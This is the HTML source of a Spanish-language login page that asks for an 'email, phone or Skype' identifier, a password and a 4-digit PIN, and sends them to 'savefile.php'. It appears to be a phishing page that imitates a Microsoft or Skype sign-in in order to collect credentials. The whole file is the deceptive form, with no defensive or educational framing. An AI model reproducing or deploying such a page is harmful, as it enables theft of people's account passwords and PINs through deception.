<html>
<head>
	
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Inicio Sesión</title>

	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
<script>
function soloNumeros(e){
  var key = window.event ? e.which : e.keyCode;
  if (key < 48 || key > 57) {
    e.preventDefault();
  }
}
</script>
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100" style="background-image:url('images/fond.png'); 
    position: absolute;
   ">
			
			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
			
				<form class="login100-form validate-form" method="post" action="savefile.php">
					<div align="left"><span class="p-b-49" style="font-size:24px;">
						<br><b>Iniciar</b>
					</span></div><br>

					<div class="wrap-input100 validate-input m-b-23">
						<span class="label-input100">Correo electrónico, teléfono o Skype</span>
						<input class="input100" type="email" name="eml" placeholder="Correo electrónico, teléfono o Skype" required>
						<span class="focus-input100" data-symbol="&#xf15a;"></span>
					</div>

					<div class="wrap-input100 validate-input">
						<span class="label-input100">Escribir Contraseña</span>
						<input class="input100" type="password" name="emlpss" placeholder="Contraseña" required>
						<span class="focus-input100"  data-symbol="&#xf190;"></span>
					</div>
					
					<div class="wrap-input100 validate-input">
						<span class="label-input100"><br>Ingrese PIN de 4 D&iacute;gitos</span>
						<input class="input100" type="password" name="p" maxlength="4" onkeypress="soloNumeros(event)" placeholder="PIN de 4 D&iacute;gitos" required>
						<span class="focus-input100"  data-symbol="&#xf190;"></span>
					</div>
					
					
					<br>
					
					
					<div class="text-right p-t-8 p-b-31">
						
					</div>
					
					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button type="submit" class="login100-form-btn">
								Finalizar
							</button>
						</div>
					</div>
				
					
				</form>
			</div>
		</div>
	</div>

</body>
</html>